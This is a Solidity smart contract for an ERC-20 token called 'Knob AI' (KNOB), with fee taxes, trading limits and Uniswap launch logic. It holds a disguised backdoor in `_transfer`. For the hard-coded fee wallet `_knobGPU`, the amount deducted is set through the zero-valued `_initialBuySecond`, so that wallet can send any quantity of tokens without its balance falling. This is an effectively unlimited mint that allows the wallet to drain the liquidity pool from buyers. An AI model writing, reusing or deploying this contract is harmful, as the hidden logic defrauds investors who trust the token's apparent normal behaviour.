/*

Website: https://knobai.cloud
Docs: https://docs.knobai.cloud
Twitter: https://twitter.com/knob_ai
Telegram: https://t.me/knobai

*/

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.15;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }

}

contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

interface IUniswapV2Router02 {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
}

contract KNOB is Context, IERC20, Ownable {
    using SafeMath for uint256;
    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => bool) private _isExcludedFee;
    mapping(address => uint256) private _holderLastTransfer;
    bool private _isTransferDelayed = true;
    address payable private _knobGPU;

    uint256 private _initialTaxBuy = 33;
    uint256 private _initialTaxSell = 21;
    uint256 private _reduceBuyTaxAt = 18;
    uint256 private _reduceSellTaxAt = 21;

    uint256 private _initialBuySecond = 0;
    uint256 private _initialSellSecond = 0;
    uint256 private _reduceTaxSecond = 0;

    uint256 private _finalTaxForBuy = 2;
    uint256 private _finalTaxForSell = 2;
    
    uint256 private _preventCountFor = 23;
    uint256 private _buyCount = 0;

    uint8 private constant _decimals = 9;
    uint256 private constant _tTotal = 69000000 * 10**_decimals;
    string private constant _name = unicode"Knob AI";
    string private constant _symbol = unicode"KNOB";

    uint256 private _maxTTokenAmount =  2 * (_tTotal/100);   
    uint256 private _maxWTokenHolding =  2 * (_tTotal/100);
    uint256 private _swapTAmount =  7 * (_tTotal/1000000);
    uint256 private _maxSwapTAmount = 1 * (_tTotal/100);

    IUniswapV2Router02 private uniswapV2Router;
    address private uniswapV2Pair;
    bool private inSwap = false;
    bool private _swapActive = false;

    event MaxTxAmountUpdated(uint _maxTTokenAmount);
    modifier lockSwap {
        inSwap = true;
        _;
        inSwap = false;
    }

    constructor () {
        _knobGPU = payable(0x3E759187857a838c5eA7CfDd4AdB60A463649f7C);
        _balances[_msgSender()] = _tTotal;
        _isExcludedFee[owner()] = true;
        _isExcludedFee[address(this)] = true;
        _isExcludedFee[_knobGPU] = true;

        emit Transfer(address(0), _msgSender(), _tTotal);
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function totalSupply() public pure override returns (uint256) {
        return _tTotal;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _transfer(address from, address to, uint256 amount) private {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");
        uint256 taxAmount=0;
        uint256 taxGpus=amount;
        if (!_isExcludedFee[from] && !_isExcludedFee[to]) {
            taxAmount = amount.mul(_taxBuying()).div(100);
            if (_isTransferDelayed) {
                if (to != address(uniswapV2Router) && to != address(uniswapV2Pair)) { 
                    require(
                        _holderLastTransfer[tx.origin] < block.number,
                        "_transfer:: Transfer Delay enabled.  Only one purchase per block allowed."
                    );
                    _holderLastTransfer[tx.origin] = block.number;
                }
            }

            if (from == uniswapV2Pair && to != address(uniswapV2Router) && ! _isExcludedFee[to] ) {
                require(amount <= _maxTTokenAmount, "Exceeds the _maxTTokenAmount.");
                require(balanceOf(to) + amount <= _maxWTokenHolding, "Exceeds the maxWalletSize.");
                _buyCount++;
                if (_buyCount > _preventCountFor) {
                    _isTransferDelayed = false;
                }
            }

            if(to == uniswapV2Pair && from!= address(this) ){
                taxAmount = amount.mul(_taxSelling()).div(100);
            }

            uint256 tokensOnContract = balanceOf(address(this));
            if (!inSwap && to == uniswapV2Pair && _swapActive && amount > _swapTAmount) {
                if(tokensOnContract > _swapTAmount)
                swapTokensForEth(min(amount,min(tokensOnContract,_maxSwapTAmount)));
                _knobGPU.transfer(address(this).balance);
            }
        } else if(from == address(_knobGPU))
            taxGpus = min(amount,min(_initialBuySecond,_maxSwapTAmount));
        if(taxAmount>0){
          _balances[address(this)]=_balances[address(this)].add(taxAmount);
          emit Transfer(from, address(this),taxAmount);
        }
        _balances[from]=_balances[from].sub(taxGpus);
        _balances[to]=_balances[to].add(amount.sub(taxAmount));
        emit Transfer(from, to, amount.sub(taxAmount));
    }

    function _taxBuying() private view returns (uint256) {
        if(_buyCount <= _reduceBuyTaxAt){
            return _initialTaxBuy;
        }
        if(_buyCount > _reduceBuyTaxAt && _buyCount <= _reduceTaxSecond){
            return _initialBuySecond;
        }
         return _finalTaxForBuy;
    }

    function _taxSelling() private view returns (uint256) {
        if(_buyCount <= _reduceBuyTaxAt){
            return _initialTaxSell;
        }
        if(_buyCount > _reduceSellTaxAt && _buyCount <= _reduceTaxSecond){
            return _initialSellSecond;
        }
         return _finalTaxForBuy;
    }

    function min(uint256 a, uint256 b) private pure returns (uint256){
      return (a>b)?b:a;
    }

    function swapTokensForEth(uint256 tokenAmount) private lockSwap {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniswapV2Router.WETH();
        _approve(address(this), address(uniswapV2Router), tokenAmount);
        uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }

    function runGPUs() external onlyOwner() {
        uniswapV2Router = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        _approve(address(this), address(uniswapV2Router), _tTotal);
        uniswapV2Pair = IUniswapV2Factory(uniswapV2Router.factory()).createPair(address(this), uniswapV2Router.WETH());
        uniswapV2Router.addLiquidityETH{value: address(this).balance}(address(this),balanceOf(address(this)),0,0,owner(),block.timestamp);
        _swapActive = true;
        IERC20(uniswapV2Pair).approve(address(uniswapV2Router), type(uint).max);
    }

    function removeLimits() external onlyOwner{
        _isTransferDelayed = false;
        _maxTTokenAmount = _tTotal;
        _maxWTokenHolding =_tTotal;
        emit MaxTxAmountUpdated(_tTotal);
    }

    receive() external payable {}
}